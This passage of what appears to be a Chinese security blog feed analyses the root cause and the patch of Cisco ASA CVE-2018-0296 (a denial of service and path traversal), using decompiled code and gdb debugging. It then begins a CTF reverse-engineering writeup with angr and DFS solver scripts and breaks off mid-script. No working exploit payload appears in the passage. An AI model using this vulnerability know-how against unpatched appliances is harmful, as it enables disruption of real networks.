to this frame (corrupt stack?)</span><br></pre></td></tr></table></figure><p>根据栈回溯信息，查看函数<code>lua_pushstring()</code>和<code>webvpn_file_name()</code>，其部分伪代码片段如下。在函数<code>webvpn_file_name()</code>中，将<code>v1 + 0x13</code>这个指针作为参数传递给<code>lua_pushstring()</code>，最终传递给<code>strlen()</code>函数。崩溃点处访问的非法内存地址为<code>0x13</code>，说明<code>v1=0</code>，即在<code>webvpn_file_name()</code>中<code>lua_touserdata()</code>返回值为<code>NULL</code>(也就是0)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall lua_pushstring(__int64 a1, const char *a2)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v2; &#x2F;&#x2F; r14</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; r13</span><br><span class="line">  _DWORD *result; &#x2F;&#x2F; rax</span><br><span class="line"></span><br><span class="line">  if ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 &#x3D; _wrap_strlen(a2);</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signed __int64 __fastcall webvpn_file_name(_QWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 v1; &#x2F;&#x2F; rax</span><br><span class="line"></span><br><span class="line">  v1 &#x3D; lua_touserdata(a1, 1);</span><br><span class="line">  lua_pushstring((__int64)a1, (const char *)(v1 + 0x13));</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由前面<code>lua</code>的相关知识可知，函数<code>lua_touserdata()</code>用于获取栈底数据。因此，很自然的想法就是分析这个<code>NULL</code>值是从哪里来的，即在什么地方通过调用<code>lua_pushnil()</code>往栈上压入了<code>NULL</code>值。</p><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>通过查找字符串<code>/+CSCOE+/files/file_list.json</code>的交叉引用定位到<code>aware_webvpn_content()</code>函数。在该函数中可以看到有很多请求<code>url</code>的字符串，同时还包含很多<code>lua</code>脚本的名称，猜测该函数应该是负责对这些请求进行处理，根据不同的请求<code>url</code>执行对应的<code>lua</code>脚本。示例如下。</p><img data-src="images/file_list_json_api.png" style="zoom:70%"><p>查看<code>files_list_json_lua</code>脚本的内容，其主要功能是列出当前路径下的目录或文件，依次调用了<code>Lua</code>中的<code>OPEN_DIR()</code>、<code>READ_DIR()</code>、<code>FILE_NAME()</code>、<code>FILE_IS_DIR()</code>等函数。而在<code>aware_addlib_netfs()</code>函数中，建立了<code>Lua</code>函数和<code>C</code>函数之间的对应关系，示例如下。</p><img data-src="images/lua_c_function.png" style="zoom:80%"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Lua函数与C函数对应关系</span></span><br><span class="line">OPEN_DIR()  &lt;---&gt;webvpn_open_dir()</span><br><span class="line">READ_DIR()&lt;---&gt;webvpn_read_dir()</span><br><span class="line">FILE_NAME()&lt;---&gt;webvpn_file_name()</span><br><span class="line">FILE_IS_DIR()&lt;---&gt;webvpn_file_is_dir()</span><br></pre></td></tr></table></figure><p>在查看对应的<code>C</code>函数时，在<code>webvpn_read_dir()</code>函数中，有一个对<code>lua_pushnil()</code>函数的调用。根据函数的调用顺序，猜测<code>webvpn_file_name()</code>函数中获取到的<code>NULL</code>值来自于这里。</p><img data-src="images/call_lua_pushnil.png" style="zoom:80%"><h4 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h4><p>根据之前的猜测，尝试在调用<code>lua_pushnil()</code>处下断点，然后查看<code>Lua</code>栈上的数据，如下。</p><img data-src="images/lua_pushnil_breakpoint.png" style="zoom:100%"><p>其中，<code>rdi</code>指向的数据结构的定义大致如下，这里主要关注其中的<code>lua_stack_top_ptr</code>和<code>lua_stack_base_ptr</code>两个指针，分别指向<code>Lua</code>栈的栈顶和栈底，栈中的元素就是前面提到的<code>&#123;类型，值&#125;</code>结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    uint64 xxx;</span><br><span class="line">    uint64 xxx;   </span><br><span class="line">    uint64 lua_stack_top_ptr;    <span class="comment">// 指向栈顶   (空栈，即始终指向刚入栈元素的下一个位置)</span></span><br><span class="line">    uint64 lua_stack_base_ptr;   <span class="comment">// 指向栈底   (栈地址由低向高增长)</span></span><br><span class="line">    uint64 xxx;</span><br><span class="line">    uint64 xxx;</span><br><span class="line">    uint64 xxx;</span><br><span class="line">    uint64 xxx;</span><br><span class="line">    ... </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后在<code>webvpn_file_name()</code>中调用<code>lua_touserdata()</code>函数前下断点，查看此时<code>Lua</code>栈上的内容，如下。此时，<code>lua_touserdata()</code>函数的第2个参数为1，即获取<code>Lua</code>栈底的数据，而此时栈底的数据为<code>NULL</code>。</p><img data-src="images/call_lua_touserdata.png" style="zoom:100%"><p>继续单步执行程序，查看函数<code>lua_touserdata()</code>的返回值。可以看到，其返回值确实为<code>NULL</code>，之后将一个非法内存地址<code>0x13</code>作为参数传入了<code>lua_pushstring()</code>，最终导致<code>Segmentation fault</code>错误。</p><img data-src="images/call_lua_pushstring.png"><p>但是，这里的<code>NULL</code>值并不是来自之前<code>lua_pushnil()</code>压入的<code>nil</code>值，而是位于其下面的栈元素。在下断点调试的过程中，发现设置的2个断点均只命中一次就触发了问题，极大地缩小了调试的范围。同时，在2个断点处<code>Lua</code>栈的地址是一样的，因此可以在第1个断点命中后，对相应的<code>Lua</code>栈地址设置硬件断点，看在哪个地方对其值进行了修改。</p><p>在<code>gdb</code>中设置硬件断点后，继续执行时提示如下错误。网上查找相应的解决方案，建议使用<code>set can-use-hw-watchpoints 0</code>，但实际测试时貌似也存在问题。最后采用<code>hook-stop</code>的方式来观察指定地址处的内容。</p><img data-src="images/watchpoint_error.png"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">define hook-stop</span><br><span class="line">x/2gx &lt;addr&gt;</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>通过设置断点并查看相应地址处的内容，最终定位到修改内容的地方位于<code>luaV_execute()</code>中。对照<code>lua-5.0</code>源码，<code>luaV_execute()</code>函数是<code>Lua VM</code>执行字节码的入口，修改内容的地方位于<code>OP_GETGLOBAL</code>操作码的处理流程中。</p><img data-src="images/modify_value.png" style="zoom:80%"><h4 id="asav962与asa924执行流程对比"><a href="#asav962与asa924执行流程对比" class="headerlink" title="asav962与asa924执行流程对比"></a>asav962与asa924执行流程对比</h4><p>前面的分析定位到了<code>luaV_execute()</code>函数中，而该函数属于<code>Lua VM</code>的一部分，难道是因为<code>files_list_json_lua</code>脚本存在问题，而导致<code>Lua VM</code>执行字节码时出现错误？由于该拒绝服务漏洞对型号为<code>asa924</code>的设备没有影响，下面对<code>asa924</code>设备上对应的执行流程进行分析。</p><p>根据前面的分析思路，在<code>webvpn_file_name()</code>中设置断点，发现其流程与<code>asav962</code>类似，<code>lua_touserdata()</code>函数的返回值同样会为<code>NULL</code>，而<code>asa924</code>设备却不会发生崩溃。2个<code>webvpn_file_name()</code>的对比如下。</p><img data-src="images/webvpn_file_name_compare.png" style="zoom:60%"><p>通过调试可知，针对32位程序(<code>asa924</code>)，<code>lua_touserdata()</code>函数的返回值为指向字符串的指针。当该指针为空时，其直接作为参数传入<code>lua_pushstring()</code>，而在<code>lua_pushstring()</code>中会对参数是否为空进行判断。而针对64位程序(<code>asav962</code>)，<code>lua_touserdata()</code>函数的返回值为指向某个结构体的指针。当该指针为空时，传入<code>lua_pushstring()</code>的参数为<code>0x13</code>，从而”绕过“了<code>lua_pushstring()</code>中的校验，最终造成非法内存地址访问。</p><p>至此，分析清楚了该拒绝服务漏洞产生的原因，主要是由于32位程序和64位程序中<code>lua_touserdata()</code>函数的返回值代表的结构不一致造成的。</p><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>在镜像<code>asav9101.qcow2</code>中该漏洞被修复了。基于前面对漏洞形成原因的分析，下面以<code>asav9101.qcow2</code>镜像为例，对漏洞的修复情况进行简单分析。</p><h4 id="目录遍历漏洞补丁分析"><a href="#目录遍历漏洞补丁分析" class="headerlink" title="目录遍历漏洞补丁分析"></a>目录遍历漏洞补丁分析</h4><p>通过动态调试分析，对请求<code>url</code>的解析在<code>UrlSniff_cb()</code>函数中完成，其中增加了对<code>./</code>和<code>../</code>的处理逻辑，部分代码如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">v16 = *v5;<span class="comment">// v5 指向请求url</span></span><br><span class="line">v17 = v5;</span><br><span class="line">v18 = v5;</span><br><span class="line">LABEL_45:</span><br><span class="line"><span class="keyword">while</span> ( v16 )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( v16 == <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v20 = v18[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">switch</span> ( v20 )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">        v9 = (<span class="keyword">unsigned</span> __int8)v18[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !(_BYTE)v9 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)v9 == <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">        v20 = v18[<span class="number">3</span>];<span class="comment">// 匹配到&quot;../&quot;</span></span><br><span class="line">        v18 += <span class="number">2</span>;</span><br><span class="line">LABEL_75:</span><br><span class="line">        ++v18;</span><br><span class="line">        v16 = v20;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">        v16 = v18[<span class="number">2</span>];<span class="comment">// 匹配到&quot;./&quot;</span></span><br><span class="line">        v18 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">        ++v18;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_60;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">LABEL_48:</span><br></pre></td></tr></table></figure><h4 id="拒绝服务漏洞补丁分析"><a href="#拒绝服务漏洞补丁分析" class="headerlink" title="拒绝服务漏洞补丁分析"></a>拒绝服务漏洞补丁分析</h4><p>根据前面的分析可知，拒绝服务漏洞的触发位置在函数<code>webvpn_file_name()</code>中。在镜像<code>asav9101.qcow2</code>中，该函数内容如下，可以看到并没有对该函数进行更改。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">webvpn_file_name proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     esi, 1</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">push    rbx</span><br><span class="line">mov     rbx, rdi</span><br><span class="line">sub     rsp, 8</span><br><span class="line">call    lua_touserdata</span><br><span class="line">mov     rdi, rbx</span><br><span class="line">lea     rsi, [rax+13h]</span><br><span class="line">call    lua_pushstring</span><br><span class="line">add     rsp, 8</span><br><span class="line">mov     eax, 1</span><br><span class="line">pop     rbx</span><br><span class="line">pop     rbp</span><br><span class="line">retn</span><br><span class="line">; &#125;</span><br></pre></td></tr></table></figure><p>在字符串列表中查找<code>/+CSCOE+/files/file_list.json</code>显示没有结果，表明在该镜像中将这个接口去掉了。同时根据之前<code>files_list_json_lua</code>脚本的内容进行查找，在该镜像中仍然可以找到对应的<code>lua</code>脚本内容，但是找不到对该脚本的交叉引用，进一步证实该接口<code>/+CSCOE+/files/file_list.json</code>被去掉了。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>利用<code>CVE-2018-0296</code>漏洞，远程未认证的攻击者可以对目标设备实施拒绝服务攻击，或从设备获取敏感信息。</li><li>拒绝服务漏洞的形成原因是由于32位程序和64位程序中<code>lua_touserdata()</code>函数的返回值代表的结构不一致造成。</li><li>在镜像<code>asav9101.qcow2</code>中已经修复了该漏洞，其中拒绝服务漏洞的修复方式是去掉了触发了该漏洞的请求<code>url</code>接口。</li></ul><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly90b29scy5jaXNjby5jb20vc2VjdXJpdHkvY2VudGVyL2NvbnRlbnQvQ2lzY29TZWN1cml0eUFkdmlzb3J5L2Npc2NvLXNhLTIwMTgwNjA2LWFzYWZ0ZA==">Cisco Adaptive Security Appliance Web Services Denial of Service Vulnerability<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zZWt1cmFrLnBsL29waXMtYmxlZHUtY3ZlLTIwMTgtMDI5Ni1vbWluaWVjaWUtdXdpZXJ6eXRlbG5pZW5pYS13LXdlYmludGVyZmVqc2llLWNpc2NvLWFzYS8=">Error description CVE-2018-0296 - bypassing authentication in the Cisco ASA web interface<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDQ5NTY=">Cisco Adaptive Security Appliance - Path Traversal<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pbG8yMDEyL0NWRS0yMDE4LTAyOTY=">Test CVE-2018-0296 and extract usernames<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy5jbmJsb2dzLmNvbS9zZXZlbnl1YW4vcC80NTExODA4Lmh0bWw=">Lua和C++交互详细总结<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzExNDc0MS5odG1s">网络设备漏洞分析技术研究<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cubmNjZ3JvdXAudHJ1c3QvdWsvYWJvdXQtdXMvbmV3c3Jvb20tYW5kLWV2ZW50cy9ibG9ncy8yMDE3L3NlcHRlbWJlci9jaXNjby1hc2Etc2VyaWVzLXBhcnQtb25lLWludHJvLXRvLXRoZS1jaXNjby1hc2Ev">Cisco ASA series part one: Intro to the Cisco ASA<i class="fa fa-external-link-alt"></i></span></li></ul><br /><blockquote><p>本文首发于安全客，文章链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTcxOTE2">https://www.anquanke.com/post/id/171916<i class="fa fa-external-link-alt"></i></span></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cisco </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf-201809 re writeup</title>
      <link href="2018/10/28/ctf-201809-re-writeup/"/>
      <url>2018/10/28/ctf-201809-re-writeup/</url>
      
        <content type="html"><![CDATA[<h3 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h3><p>使用<code>file</code>命令查看文件类型，如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file re1.exe</span></span><br><span class="line">re1.exe: PE32 executable (console) Intel 80386, for MS Windows</span><br></pre></td></tr></table></figure><p>运行该程序，提示输入flag，随机输入内容后程序退出。</p><p>利用IDA Pro加载程序进行分析，<code>main()</code>函数的主要逻辑如下：读取输入的flag(长度为22)，然后对flag内容进行一系列判断，如<code>strcmp()</code>、<code>check()</code>以及调用<code>v10</code>、<code>v11</code>和<code>v12</code>指向的函数等。</p><a id="more"></a><img data-src="images/re1_main.png" style="zoom:90%"><p>对上述函数的进行简单分析后，感觉可以直接利用<code>angr</code>框架编写脚本进行求解，如下。其中，通过对<code>scanf()</code>函数进行hook，然后直接在对应的内存地址空间写入符号值，当然也可以采用其他方式。运行后即可得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">from</span> angr.procedures.stubs.format_parser <span class="keyword">import</span> FormatParser</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyScanf</span>(<span class="params">FormatParser</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self,fmt</span>):</span></span><br><span class="line">        addr = self.state.solver.<span class="built_in">eval</span>(self.arg(<span class="number">1</span>))</span><br><span class="line">        print(<span class="string">&quot;input flag addr: %#x&quot;</span> % addr)</span><br><span class="line">        self.state.memory.store(addr, self.state.solver.BVV(<span class="string">b&#x27;f&#x27;</span>,<span class="number">8</span>), endness=self.state.arch.memory_endness)</span><br><span class="line">        self.state.memory.store(addr+<span class="number">1</span>, self.state.solver.BVV(<span class="string">b&#x27;l&#x27;</span>,<span class="number">8</span>), endness=self.state.arch.memory_endness)</span><br><span class="line">        self.state.memory.store(addr+<span class="number">2</span>, self.state.solver.BVV(<span class="string">b&#x27;a&#x27;</span>,<span class="number">8</span>), endness=self.state.arch.memory_endness)</span><br><span class="line">        self.state.memory.store(addr+<span class="number">3</span>, self.state.solver.BVV(<span class="string">b&#x27;g&#x27;</span>,<span class="number">8</span>), endness=self.state.arch.memory_endness)</span><br><span class="line">        self.state.memory.store(addr+<span class="number">4</span>, self.state.solver.BVV(<span class="string">b&#x27;&#123;&#x27;</span>,<span class="number">8</span>), endness=self.state.arch.memory_endness)</span><br><span class="line">        self.state.memory.store(addr+<span class="number">21</span>, self.state.solver.BVV(<span class="string">b&#x27;&#125;&#x27;</span>,<span class="number">8</span>), endness=self.state.arch.memory_endness)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">20</span>):</span><br><span class="line">            self.state.memory.store(addr+i, self.state.solver.BVS(<span class="string">&#x27;a%d&#x27;</span> % i, <span class="number">8</span>), endness=self.state.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">project= angr.Project(<span class="string">&#x27;./re1.exe&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>:<span class="literal">False</span>&#125;)</span><br><span class="line"></span><br><span class="line">start_address = <span class="number">0x401684</span></span><br><span class="line">find_address = <span class="number">0x4017a3</span></span><br><span class="line">avoid_address = (<span class="number">0x40171b</span>, <span class="number">0x401749</span>, <span class="number">0x4017c2</span>)</span><br><span class="line"></span><br><span class="line">project.hook_symbol(<span class="string">&#x27;scanf&#x27;</span>, MyScanf())</span><br><span class="line">state=project.factory.blank_state(addr=start_address, add_options=&#123;angr.options.LAZY_SOLVES&#125;)</span><br><span class="line">simgr = project.factory.simulation_manager(state)</span><br><span class="line">simgr.explore(find=find_address, avoid=avoid_address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    find_state = simgr.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    sp_value = find_state.solver.<span class="built_in">eval</span>(find_state.regs._sp)</span><br><span class="line">    input_addr = sp_value + <span class="number">0x11</span></span><br><span class="line">    print(<span class="string">&quot;input flag addr: %#x&quot;</span> % input_addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">20</span>):</span><br><span class="line">        value = find_state.memory.load(input_addr+i, <span class="number">1</span>)</span><br><span class="line">        find_state.add_constraints(value&gt;=<span class="number">48</span>, value &lt;=<span class="number">127</span>)</span><br><span class="line"></span><br><span class="line">    flag = [find_state.solver.<span class="built_in">eval</span>(find_state.memory.load(input_addr+i, <span class="number">1</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>)]</span><br><span class="line">    print(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, flag)))</span><br></pre></td></tr></table></figure><blockquote><p>对于输入内容的约束，既可以在写入符号值时添加，也可以在最后求解时添加。如果在写入符号值时添加约束，当符号表达式过于复杂时，可能会造成约束求解器超时，需要调整<code>solver</code>的超时时间。这里采取后面一种方式，同时添加了<code>angr.options.LAZY_SOLVES</code>选项。</p></blockquote><h3 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h3><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>使用file命令查看文件类型，如下。运行程序，提示”Segmentation fault (core dumped)”。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file re2</span></span><br><span class="line">re2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c8c5efd9f0afc405b126a0621ce63a9daccad23b, stripped</span><br></pre></td></tr></table></figure><p>使用IDA Pro加载程序进行分析，main()函数的主要处理流程如下：</p><ul><li>读取flag文件的内容，并保存在<code>byte_602ca0</code>和<code>byte_6010a0</code>中</li><li>对<code>byte_6010a0</code>中的内容进行排序(从小到大)，同时记录下标的变化<img data-src="images/re2_main_1.png"></li><li>根据<code>byte_602ca0</code>和下标数组<code>dword_6012a0</code>对<code>byte_601aa0</code>进行初始化<img data-src="images/re2_main_2.png"></li><li>统计<code>byte_6010a0</code>中每个<code>item</code>出现的次数，并将结果保存于<code>dword_601ca0</code>中(保存形式为<code>(item,count)</code>)</li><li>对<code>byte_601aa0</code>进行同样的操作，将结果保存于<code>dword_601ca0</code>中<img data-src="images/re2_main_3.png"></li><li>将<code>dword_601ca0</code>的内容写入flag_enc文件</li></ul><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>现在是要根据flag_enc文件的内容求出原始flag文件的内容。根据main()函数的处理逻辑，由flag_enc文件可以得到排序后的数组<code>byte_6010a0</code>、<code>byte_601aa0</code>，那么如何得到排序前的数组<code>byte_6010a0</code>呢？</p><p>下面用一个简单的例子来说明整个过程，如下。</p><img data-src="images/re2_simple_example.png"><h5 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h5><p>以上面的例子为例，排序的过程相当于是对矩阵$A$和$B$分别进行了变换，即存在一个初等矩阵$Y$，使得<br>$$<br>AY=A^{‘} \<br>BY=B^{‘}<br>$$<br>因此可以通过爆破的方式，对初等矩阵$Y$进行枚举，然后计算$A=A^{‘}Y^{-1}$, 然后根据$C=A(B^{‘})$进行校验即可。在本题中，初等矩阵$Y$的维数为466，爆破的复杂度为$466!$，复杂度太高。。。</p><h5 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h5><p>同样，以上面的例子为例，由$C=A(B^{‘})$可知，$C$中的元素和$A^{‘}$中的元素存在一定的对应关系，即$A^{‘}$中的元素在原始$A$中的前一个元素就是$C$中相同下标处的元素，如$A^{‘}[8]$=‘g’，其在$A$中的前一个元素为‘f’，正好对应$C[8]$。因此根据$C$和$A$，可以得到原始$A$中的一些相邻两个元素的序列片段，如下。</p><img data-src="images/re2_item_sequence.png" style="zoom:75%"><p>因此，只需要将所有的序列判断“串”起来，就可以得到原始的$A$了。那么如何“串”起来呢？</p><p>由于$A^{‘}$是经过排序的，所以在所有的序列片段中，以相同字母结尾的序列片段是存在一定的先后顺序关系的。以‘be’ 和‘ge’为例，在一个正确的序列中，必须先出现序列片段‘be’，再出现序列片段‘ge’。“串”序列的示例如下。</p><img data-src="images/re2_possible_sequence.png" style="zoom:75%"><p>其中，在序列1中，只包含4个序列片段，得到了原始$A$的一部分内容。需要说明是，在序列片段‘fg’之后，之所以没有继续“串”序列片段‘ge’，是因为已有的序列中并没有出现序列片段‘be’，根据序列片段的先后关系，所以不能“串”序列片段‘ge’。在序列2中，包含了全部的9个序列片段，得到原始的$A$。</p><p>因此，根据该思路，可以采用深度搜索算法来枚举可能的序列，找到一个能够包含所有的片段的序列即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./flag_enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    dword_601ca0 = f.read()</span><br><span class="line"></span><br><span class="line">byte_6010a0_sorted = []</span><br><span class="line">byte_601aa0 = 